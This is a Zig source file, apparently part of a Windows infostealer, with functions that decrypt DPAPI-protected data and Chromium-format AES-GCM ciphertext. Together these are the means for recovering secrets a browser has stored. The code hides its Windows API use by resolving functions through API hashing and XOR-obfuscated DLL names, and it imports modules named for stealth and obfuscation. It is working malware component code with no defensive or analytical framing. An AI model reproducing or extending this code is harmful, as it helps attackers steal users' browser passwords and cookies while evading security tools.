const std = @import("std");
const furtivo = @import("furtivo.zig");
const obf = @import("obf.zig");

const DATA_BLOB = extern struct {
    cbData: u32,
    pbData: [*]u8,
};

const CryptUnprotectDataFn = *const fn (
    *const DATA_BLOB, // pDataIn
    ?*?[*]u16, // ppszDataDescr
    ?*const DATA_BLOB, // pOptionalEntropy
    ?*anyopaque, // pvReserved
    ?*anyopaque, // pPromptStruct
    u32, // dwFlags
    *DATA_BLOB, // pDataOut
) callconv(.winapi) c_int;

const LocalFreeFn = *const fn ([*]u8) callconv(.winapi) ?*anyopaque;

pub fn unprotectData(allocator: std.mem.Allocator, encrypted_data: []const u8) ![]u8 {
    if (encrypted_data.len == 0) return error.EmptyData;

    // Resolve crypt32.dll dynamically
    const crypt32_name = obf.xorStr("crypt32.dll");
    const crypt32 = furtivo.getModuleHandle(&crypt32_name);
    if (crypt32 == 0) return error.Crypt32NotFound;

    const crypt_unprotect_addr = obf.getProcAddressByHash(crypt32, comptime obf.apiHash("CryptUnprotectData")) catch 0;
    if (crypt_unprotect_addr == 0) return error.CryptUnprotectDataNotFound;
    const CryptUnprotectData = @as(CryptUnprotectDataFn, @ptrFromInt(crypt_unprotect_addr));

    // Resolve LocalFree from kernel32.dll dynamically
    const k32_name = obf.xorStr("kernel32.dll");
    const k32 = furtivo.getModuleHandle(&k32_name);
    if (k32 == 0) return error.Kernel32NotFound;

    const local_free_addr = obf.getProcAddressByHash(k32, comptime obf.apiHash("LocalFree")) catch 0;
    if (local_free_addr == 0) return error.LocalFreeNotFound;
    const LocalFree = @as(LocalFreeFn, @ptrFromInt(local_free_addr));

    const data_in = DATA_BLOB{
        .cbData = @intCast(encrypted_data.len),
        .pbData = @constCast(encrypted_data.ptr),
    };

    var data_out = DATA_BLOB{
        .cbData = 0,
        .pbData = undefined,
    };

    const CRYPTPROTECT_UI_FORBIDDEN = 0x1;
    if (CryptUnprotectData(&data_in, null, null, null, null, CRYPTPROTECT_UI_FORBIDDEN, &data_out) == 0) {
        return error.CryptUnprotectDataFailed;
    }
    defer _ = LocalFree(data_out.pbData);

    const decrypted = try allocator.alloc(u8, data_out.cbData);
    @memcpy(decrypted, data_out.pbData[0..data_out.cbData]);
    return decrypted;
}

pub fn decryptAESGCM(allocator: std.mem.Allocator, key: []const u8, iv: []const u8, ciphertext: []const u8) ![]u8 {
    if (key.len != 32) return error.InvalidKeySize;

    // In Chromium, the payload has the tag appended at the end (last 16 bytes)
    if (ciphertext.len < 16) return error.CiphertextTooShort;
    const actual_ciphertext = ciphertext[0..ciphertext.len - 16];
    const tag = ciphertext[ciphertext.len - 16..][0..16];

    const plaintext = try allocator.alloc(u8, actual_ciphertext.len);
    errdefer allocator.free(plaintext);

    // Using Zig's standard library for AES-GCM
    const cipher = std.crypto.aead.aes_gcm.Aes256Gcm;
    try cipher.decrypt(plaintext, actual_ciphertext, tag.*, "", iv[0..12].*, key[0..32].*);
    return plaintext;
}
